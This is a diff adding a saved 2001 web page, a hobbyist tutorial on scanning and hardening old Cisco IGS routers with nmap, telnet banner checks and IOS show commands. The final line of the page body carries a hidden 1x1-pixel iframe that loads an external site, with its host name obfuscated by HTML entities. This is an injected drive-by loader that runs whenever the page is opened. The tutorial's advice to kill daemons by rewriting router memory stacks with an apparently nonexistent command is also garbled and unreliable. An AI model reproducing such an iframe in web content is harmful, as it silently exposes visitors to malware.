@@ -1,0 +1,200 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0057)http://212.187.6.213/cgi-bin/down/down.cgi?sigscr101.html -->
+<HTML><HEAD><TITLE>Securing IGS Cisco Routers v 1.01</TITLE>
+<META content="text/html; charset=ISO-8859-1" http-equiv=content-type>
+<META content="Data Wizard" name=author>
+<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
+<BODY>
+<DIV align=center><BIG><BIG><BIG><B>Securing IGS Cisco Routers v 
+1.01<BR></B></BIG></BIG></BIG></DIV><BR><BR>This paper will describe how you 
+should obtain remote and local, information about an IGS Cisco Router. It&#8217;s 
+recommended if you have some experience with configuring Cisco Routers before 
+reading this paper, by the way it doesn&#8217;t matter which model you own. And more 
+important, you must own and know how to use a Unix oriented operating system. 
+After we have collected some information that is useful to us, we&#8217;ll try to 
+secure the router as good as possible. And please note, this paper is for 
+educational purposes only and I&#8217;m not responsible in any way for your stupid 
+actions if you&#8217;ll be caught.<BR><BR>Because the probability you don&#8217;t have an 
+IGS Cisco Router but a newer model like the IOS, it could happen you get 
+different outputs at programs like &#8220;nmap&#8221;. Also while securing the router it&#8217;s 
+possible you have to use some other commands than I do. Grab your manual if you 
+have one and try to find the correct command.<BR><BIG><BR></BIG><BIG><B>Getting 
+the information remote:</B></BIG><BR><BR>I assume you already have configured 
+you Cisco Router and your Unix box with the proper outfit. But because I know 
+there still are people who don&#8217;t know where to download the tools we&#8217;re going to 
+use, I&#8217;ve placed some links at the bottom of this paper which could be 
+useful.<BR><BR>I always start with an &#8220;nmap&#8221;-scan, we need to know first which 
+daemons are running at the remote host. Because I do own a couple of IGS Cisco 
+Routers myself, I&#8217;ll use the router with IP &#8220;169.254.0.10&#8221; for this paper. A 
+daemon can listen on various sockets, like UDP, TCP, IPX and SPX it could take a 
+long time before they all are scanned. And if you&#8217;re not at the same segment as 
+where the remote router is located, it&#8217;s completely useless to scan sockets 
+other than TCP and UDP. Protocols other than 802.3(Standard LLC, SNAP LLC and 
+RAW) &amp; IP will standard not be rotated by any (internet)-router!<BR><BR>Well 
+we only will scan all listening TCP and UDP sockets and we use the following 
+command at the Unix shell: &#8220;nmap -sT -sU -p 1-65535 169.254.0.10&#8221;. For a 
+complete overview of all possibilities type: &#8220;man nmap&#8221;.<BR><BR>Port &nbsp; 
+&nbsp; &nbsp; State &nbsp; &nbsp; &nbsp; Service<BR><BR>7/tcp &nbsp;&nbsp; 
+&nbsp; open &nbsp;&nbsp; &nbsp; &nbsp; echo<BR>7/udp &nbsp; &nbsp; open 
+&nbsp;&nbsp; &nbsp; &nbsp; echo<BR>9/tcp &nbsp;&nbsp; &nbsp; open &nbsp;&nbsp; 
+&nbsp; &nbsp; discard<BR>9/udp &nbsp; &nbsp; open &nbsp;&nbsp; &nbsp; &nbsp; 
+discard<BR>23/tcp &nbsp; &nbsp; open &nbsp;&nbsp; &nbsp; &nbsp; telnet<BR>49/udp 
+&nbsp;&nbsp; open &nbsp;&nbsp; &nbsp; &nbsp; tacacs<BR>67udp &nbsp; &nbsp; open 
+&nbsp;&nbsp; &nbsp; &nbsp; bootps<BR>79/tcp &nbsp; &nbsp; open &nbsp;&nbsp; 
+&nbsp; &nbsp; finger<BR>161/udp &nbsp; open &nbsp; &nbsp; &nbsp; 
+snmp<BR>1993/tcp &nbsp; open &nbsp;&nbsp; &nbsp; &nbsp; 
+snmp-tcp-port<BR><BR>Above you notice an output of nmap, now I try to describe 
+every daemon&#8230;<BR><BR>By default many FTP daemons will use 20/TCP and 21/TCP, 
+while many Gopher daemons will only listen on 70/TCP, every daemon uses it&#8217;s 
+standard port. Of course you can configure the daemon so it listens at a 
+different port. So it&#8217;s possible that &#8216;behind&#8217; 79/TCP at the IGS Cisco Router 
+there is listening another daemon then a finger daemon. There are two ways to 
+discover what daemon will really listen on a socket, one search in your IGS 
+Cisco Router manual; two establish a telnet session to the daemon. I&#8217;m trying to 
+establish a telnet session to all daemons, most times you get enough information 
+from the &#8216;banner&#8217;.<BR><BR>Echo (7/TCP&amp;UDP)<BR><BR>SorNOT:~ # telnet 
+169.254.0.10 7<BR>Trying 169.254.0.10...<BR>Connected to 169.254.0.10.<BR>Escape 
+character is '^]'.<BR>hu<BR>hu<BR>:)<BR>:)<BR>echo<BR>echo<BR><BR>This daemon 
+will echo all commands nicely&#8230; but will not be really useful to us. So it&#8217;s 
+recommended to kill the daemon. Unless you want to have some digital chat friend 
+if you&#8217;re feeling bored&#8230; :-P<BR><BR><BR>Discard (9/TCP&amp;UDP)<BR><BR>This 
+daemon is kind of funny (check the RFC), but isn&#8217;t also very useful, so kill 
+it...<BR><BR><BR>Telnet (23/TCP)<BR><BR>lappie:~/IGS # telnet 169.254.0.10 
+23<BR>Trying 169.254.0.10...<BR>Connected to 169.254.0.10.<BR>Escape character 
+is '^]'.<BR>User Access Verification<BR>Password:<BR>CiscoRouter&gt;<BR><BR>This 
+is a well-known daemon&#8230; I suppose you are familiar with it.<BR><BR><BR>Tacacs 
+(49/UDP)<BR><BR>This (Terminal Access Controller Access Control System) daemon 
+has a function I will never use&#8230; this daemon control dial-up lines. This option 
+is being used (only?) by Internet Service Providers, where their customers&#8230; well 
+create a connection to the Internet perhaps?<BR><BR><BR>Bootps 
+(67/UDP)<BR><BR>With this protocol you can remote configure a Cisco Router&#8230; 
+because your router has already been configured it&#8217;s not necessary anymore to 
+keep the daemon alive.<BR><BR><BR>Finger (79/TCP)<BR><BR>lappie:~/IGS # telnet 
+169.254.0.10 79<BR>Trying 169.254.0.10...<BR>Connected to 
+169.254.0.10.<BR>Escape character is '^]'.<BR><BR>&nbsp;&nbsp; Line &nbsp;&nbsp; 
+User &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Host(s) &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; Idle &nbsp; &nbsp; Location<BR>*&nbsp; 2 vty &nbsp; 0 
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; idle &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; 
+169.254.0.3<BR><BR>Connection closed by foreign host.<BR><BR>Here we get some 
+pretty valuable information, about who has established a connection to the 
+IGS-CR and from where&#8230; this daemon can also being used by a command within a 
+shell. So if you want to kill the daemon remember you cannot anymore use it from 
+within a shell.<BR><BR><BR>SNMP (161/UDP)<BR><BR>This (Simple Network Management 
+Protocol) daemon will come in handy in some situations, but I don&#8217;t see any 
+reason to let it &#8216;live&#8217;.<BR><BR><BR>SNMP-tcp-port (1993/tcp)<BR><BR>This is the 
+tcp version of the SNMP at 161/udp&#8230; so if you want to stop this daemon you have 
+to check if the daemon behind 1993/tcp is stopped 
+too.<BR><BR><BIG><BR></BIG><BIG><B>Getting the information 
+local:</B></BIG><BR><BR>We also can request information about the IGS-CR 
+locally, you don&#8217;t need to have &#8216;enable&#8217; privileges for this. With the command 
+&#8220;show processes&#8221; you&#8217;ll get the following output like 
+below.<BR><BR>CiscoRouter#show processes<BR><BR>&nbsp; CPU utilization for one 
+minute: 15%; for five minutes: 15%<BR><BR>&nbsp; PID Q T &nbsp;&nbsp; &nbsp; PC 
+Runtime (ms) &nbsp;&nbsp; Invoked &nbsp; uSecs &nbsp; Stacks&nbsp; TTY 
+Process<BR><BR>&nbsp; &nbsp; 1 M E 1019D28 &nbsp;&nbsp; &nbsp; &nbsp; 49052 
+&nbsp; &nbsp; &nbsp; 5275 &nbsp;&nbsp; 9298&nbsp; 876/1000 &nbsp; 0 Net 
+Background<BR>&nbsp; &nbsp; 2 L E 102D2EC &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; 0 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 4 &nbsp; &nbsp; &nbsp; 0&nbsp; 
+880/1000 &nbsp; 0 Logger<BR>&nbsp;&nbsp; 27 M * &nbsp; &nbsp; F14 &nbsp;&nbsp; 
+&nbsp; &nbsp; &nbsp; 548 &nbsp; &nbsp; &nbsp; &nbsp; 55 &nbsp;&nbsp; 9963&nbsp; 
+678/1200 &nbsp; 2 Virtual Exec<BR>&nbsp;&nbsp; 28 L E 10581C8 &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 28 &nbsp; &nbsp; &nbsp; &nbsp; 20 &nbsp;&nbsp; 1400&nbsp; 
+824/1000 &nbsp; 0 UDP Echo<BR>&nbsp; &nbsp; 5 M E 10581C8 &nbsp;&nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp; 52 &nbsp; &nbsp; &nbsp; 
+0&nbsp; 898/1000 &nbsp; 0 BOOTP Server<BR>&nbsp; &nbsp; 6 H E 1010ABA &nbsp; 
+&nbsp; &nbsp; 485848 &nbsp;&nbsp; &nbsp; 74667 &nbsp;&nbsp; 6506&nbsp; 536/900 
+&nbsp;&nbsp; 0 IP Input<BR>&nbsp; &nbsp; 7 M E 1062DA6 &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; 68 &nbsp;&nbsp; &nbsp; 21114 &nbsp; &nbsp; &nbsp; 3&nbsp; 804/1000 
+&nbsp; 0 TCP Timer<BR>&nbsp; &nbsp; 8 L E 1063FA4 &nbsp;&nbsp; &nbsp; &nbsp; 
+&nbsp; 164 &nbsp;&nbsp; &nbsp; &nbsp; 161 &nbsp;&nbsp; 1018&nbsp; 766/1000 
+&nbsp; 0 TCP Protocols<BR>&nbsp; &nbsp; 9 L E 101E646 &nbsp; &nbsp; &nbsp; 
+&nbsp; 1568 &nbsp; &nbsp; &nbsp; 2321 &nbsp; &nbsp; 675&nbsp; 854/1000 &nbsp; 0 
+ARP Input<BR>&nbsp;&nbsp; 10 L E 1010ABA &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; 0 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; 0&nbsp; 
+938/1000 &nbsp; 0 Probe Input<BR>&nbsp;&nbsp; 29 L E 10581C8 &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 24 &nbsp; &nbsp; &nbsp; &nbsp; 20 &nbsp;&nbsp; 1200&nbsp; 
+824/1000 &nbsp; 0 UDP Echo<BR>&nbsp;&nbsp; 12 M E 1035092 &nbsp;&nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 0 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 2 &nbsp; &nbsp; &nbsp; 
+0&nbsp; 968/1000 &nbsp; 0 Timers<BR>&nbsp;&nbsp; 13 H E 1010ABA &nbsp;&nbsp; 
+&nbsp; &nbsp; 19472 &nbsp;&nbsp; &nbsp; 54616 &nbsp; &nbsp; 356&nbsp; 412/500 
+&nbsp;&nbsp; 0 Net Input<BR>&nbsp;&nbsp; 14 M T 100E474 &nbsp;&nbsp; &nbsp; 
+&nbsp; &nbsp; 336 &nbsp; &nbsp; 104907 &nbsp; &nbsp; &nbsp; 3&nbsp; 790/1000 
+&nbsp; 0 TTY Background<BR>&nbsp;&nbsp; 15 L E 10E2722 &nbsp;&nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 0 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; 
+0&nbsp; 896/1000 &nbsp; 0 IP SNMP<BR>&nbsp;&nbsp; 30 L E 10581C8 &nbsp;&nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp; 20 &nbsp; &nbsp; 
+&nbsp; 0&nbsp; 946/1000 &nbsp; 0 UDP Discard<BR>&nbsp;&nbsp; 31 L E 10581C8 
+&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp; 20 &nbsp; 
+&nbsp; &nbsp; 0&nbsp; 946/1000 &nbsp; 0 UDP Discard<BR><BR>With the command 
+&#8220;show stacks&#8221; you&#8217;ll get more information about the 
+daemons.<BR><BR>CiscoRouter#show stacks<BR><BR>Minimum process 
+stacks:<BR>Free/Size&nbsp; Name<BR>734/1000&nbsp; Init<BR>970/1000&nbsp; Pakmon 
+Init<BR>962/1000&nbsp; MOP Protocols<BR>934/1000&nbsp; UDP 
+Discard<BR>678/1200&nbsp; Virtual Exec<BR>786/1000&nbsp; TCP 
+Discard<BR>782/1000&nbsp; TCP Echo<BR>820/1000&nbsp; UDP Echo<BR><BR>Interrupt 
+level stacks:<BR>Level &nbsp;&nbsp; Called Free/Size&nbsp; Name<BR>&nbsp; 3 
+&nbsp; &nbsp; &nbsp; &nbsp; 417&nbsp; 964/1000&nbsp; Serial interface state 
+change interrupt<BR>&nbsp; 4 &nbsp;&nbsp; &nbsp; 580538&nbsp; 886/1000&nbsp; 
+Network interfaces<BR>&nbsp; 5 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 46&nbsp; 
+968/1000&nbsp; Console Uart<BR><BR><BR>
+<DIV align=left><BIG><B>Securing IGS-CR</B></BIG><BR></DIV><BR>We need the 
+combination of the remote and locally gathered information to stop the 
+unnecessary daemons&#8230; We have several ways to do this:<BR><BR>The simplest way is 
+to use the program &#8216;setup&#8217;. Here we can say for example, do not load the SNMP 
+daemon by simple entering &#8216;yes or no&#8217; by the options. <BR>I know not many people 
+will try this way to unload the unnecessary daemons, because: one it&#8217;s not easy 
+to find; and two you really have to know what you&#8217;re doing. But it&#8217;s possible to 
+read out the whole memory stack and find the right offset of a daemon and 
+rewrite the memory so the daemon will be killed. <BR>As far I know the IGS 
+series do not have an internal (network) firewall or such, properly the newer 
+ones does have it. I will not discuss how to set-up the firewall, because simply 
+said I don&#8217;t know how to do this right now. What I do want to mention is with 
+this type of firewall you have the option to filter the daemons for unwanted 
+connections. You can create rules like, 169.254.0.11 may connect to the telnet 
+daemon but 169.254.0.20 may not. Well you get the idea, don&#8217;t you? <BR><BR>To 
+completely secure the IGS-CR we have to use the first two ways, first we use way 
+one and if then not all unnecessary daemons are stopped we&#8217;re using way two too. 
+It&#8217;s possible that you want to kill different daemons then I&#8217;m going to do&#8230; most 
+likely were talking about daemons who can&#8217;t be stopped with the &#8216;setup&#8217; menu. 
+And daemons that can&#8217;t be stopped with way one have to be stopped with way two, 
+and that requires a lot of search-time by yourself.<BR><BR>Way one is rather 
+simple, just type in &#8220;setup&#8221; and walk through the menu. To verify afterwards you 
+have stopped some unnecessary daemons type, &#8220;show processes&#8221; before and after 
+you have walked through the setup. Compare both outputs with each other, and see 
+for yourself if something has changed.<BR><BR>I know that you cannot stop all 
+unnecessary daemons with this setup program, but I try to show you how to stop 
+them &#8216;the second way&#8217;&#8230;<BR><BR>I&#8217;m going try to stop the daemon listed 
+below&#8230;<BR><BR>&nbsp;&nbsp; &#8220;15 L E 10E2722 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; 0 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; 0&nbsp; 
+896/1000 &nbsp; 0 IP SNMP&#8221;<BR><BR>With the command &#8220;show memory&#8221;, you&#8217;ll get a 
+stack dump from the whole memory. This could come in handy if we want to 
+overwrite a specific location of the memory&#8230; We can (re)-write the memory with 
+the command &#8220;write memory or erase [start stack &#8211; end stack] [new 
+data]&#8221;.<BR><BR>Address &nbsp; Bytes Prev. &nbsp; &nbsp; Next &nbsp; &nbsp; 
+&nbsp; Ref&nbsp; PrevF &nbsp; NextF &nbsp;&nbsp; Alloc PC &nbsp; 
+What<BR><BR>58850 &nbsp;&nbsp; &nbsp; 112 &nbsp;&nbsp; 587E0 &nbsp; 588C0 
+&nbsp;&nbsp; &nbsp; 1 &nbsp;&nbsp; &nbsp; &nbsp; * &nbsp;&nbsp; &nbsp; &nbsp; 
+&nbsp; * &nbsp;&nbsp; &nbsp; &nbsp; 1057FA8 &nbsp;&nbsp; IP SNMP<BR><BR>&nbsp; 
+PID Q T &nbsp;&nbsp; &nbsp; PC Runtime (ms) &nbsp;&nbsp; Invoked &nbsp; uSecs 
+&nbsp;&nbsp; Stacks &nbsp; &nbsp; TTY &nbsp; Process<BR>&nbsp; 15 &nbsp;&nbsp; L 
+E &nbsp;&nbsp; &nbsp; 10E2722 &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; 1 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; 
+896/1000 &nbsp;&nbsp; &nbsp; 0 &nbsp; &nbsp; IP SNMP<BR><BR>We could also kill 
+the so called PID address, because this depends which router you&#8217;re have I&#8217;m not 
+going to explain this any further. Just find the appropriate command in your 
+Cisco Router manual.<BR><BR>After you have killed some daemons check if they are 
+really stopped. I know that rewriting the stack is a tricky operation, and it 
+could be that your Cisco Router will stop functioning. To reset all data in the 
+NVRAM (where all configuration is being stored) type in the enabled mode &#8220;erase 
+startup config&#8221; and &#8220;reload&#8221;. Remember while doing so, you loose all your 
+configuration and such. The first time the Cisco Router is booting from flash 
+memory, consult your Cisco Router manual for specific 
+information.<BR><BR><BR>Ok, so far for this time&#8230; I have to spend my other hours 
+at learning myself more about Cisco Systems products.<BR><BR>Some 
+links:<BR><BR>http://freshmeat.net/projects/nmap/<BR>http://www.cisco.com/<BR>http://www.netterm.com/<BR><BR><BR>If 
+you have any questions or other comment related to this paper you can drop a 
+mail at mailpop3@crosswinds.net<BR><BR><BR><BR><BR><BR><BR>
+<DIV align=center>Copyright (C) 2001, Data Wizard, The 
+Netherlands.<BR></DIV><BR><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
